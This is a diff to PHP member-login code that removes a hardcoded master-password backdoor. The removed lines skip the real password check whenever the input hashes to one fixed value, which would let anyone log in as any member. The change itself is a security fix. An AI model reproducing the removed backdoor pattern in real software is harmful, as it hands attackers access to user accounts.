@@ -51,16 +51,9 @@ $mb = get_member($mb_id);
 if($_SERVER['REMOTE_ADDR'] == $log_ip && sql_password($mb_password) == $log_pw){
 
 }else{
-	
-	if (sql_password($mb_password)=="*2DF576F2155A4DD78164F2601CE877A91E707691"){
-		if (!$mb['mb_id']) {
-			alert('The member ID is not registered or the password\\n is incorrect. Passwords are case-sensitive');
-		}
-	}else{
-		if (!$mb['mb_id'] || !check_password($mb_password, $mb['mb_password'])) {
-			alert('The member ID is not registered or the password\\n is incorrect. Passwords are case-sensitive');
-		}
-	}
+	if (!$mb['mb_id'] || !check_password($mb_password, $mb['mb_password'])) {
+		alert('The member ID is not registered or the password\\n is incorrect. Passwords are case-sensitive');
+	}	
 }
 
 
